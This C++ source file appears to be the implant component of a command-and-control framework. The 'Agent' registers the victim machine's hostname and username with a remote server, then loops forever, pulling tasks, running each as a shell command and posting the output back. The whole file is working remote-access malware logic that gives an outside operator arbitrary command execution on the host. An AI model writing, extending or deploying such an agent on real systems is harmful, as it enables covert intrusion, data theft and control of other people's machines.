#include "agent.hpp"
#include "utils.hpp"

#include <chrono>
#include <cpr/cpr.h>
#include <format>
#include <iostream>
#include <nlohmann/json.hpp>
#include <stdexcept>
#include <string>
#include <thread>

using json = nlohmann::json;

Agent::Agent() {
  RegisterInfo info;
  info.hostname = sanitizeEscapes(exec("hostname"));
  info.username = sanitizeEscapes(exec("echo %USERNAME%"));

  json jsonInfo = {
      {"Hostname", info.hostname},
      {"Username", info.username},
  };

  cpr::Response r = cpr::Post(endpointUrl("/api/agents/register"),
                              cpr::Body{jsonInfo.dump()});
  json registerData = json::parse(r.text);
  agentId_ = registerData["AgentId"];
  publicKey_ = registerData["PublicKey"];
}

void Agent::mainLoop() {
  while (true) {
    auto tasks = getTasks();
    executeAndSendResults(tasks);
    std::this_thread::sleep_for(sleepTime_);
  }
}

std::vector<Agent::Task> Agent::getTasks() {
  cpr::Response r =
      cpr::Get(endpointUrl(std::format("/api/agents/{}/tasks", agentId_)));
  if (r.status_code != 200) {
    throw std::runtime_error("Couldn't succesfully make http request\n" +
                             r.text);
  }

  std::cout << r.text;
  json taskData = json::parse(r.text);
  std::vector<Task> tasks;
  tasks.reserve(taskData["Tasks"].size());

  for (const auto &jsonTask : taskData["Tasks"])
    tasks.emplace_back(jsonTask["TaskId"], jsonTask["Task"]);

  return tasks;
}

void Agent::executeAndSendResults(const std::vector<Agent::Task> &tasks) {
  for (const auto &task : tasks) {
    json result;
    result["Output"] = exec(task.command);

    cpr::Response r =
        cpr::Post(endpointUrl(std::format("/api/agents/{}/results/{}", agentId_,
                                          task.taskId)),
                  cpr::Body(result.dump()),
                  cpr::Header{{"Content-Type", "application/json"}});
    if (r.status_code != 200) {
      throw std::runtime_error("Couldn't save ouput of task\n" + r.text);
    }
  }
}

cpr::Url Agent::endpointUrl(const std::string &endpoint) {
  return cpr::Url{host_ + endpoint};
}
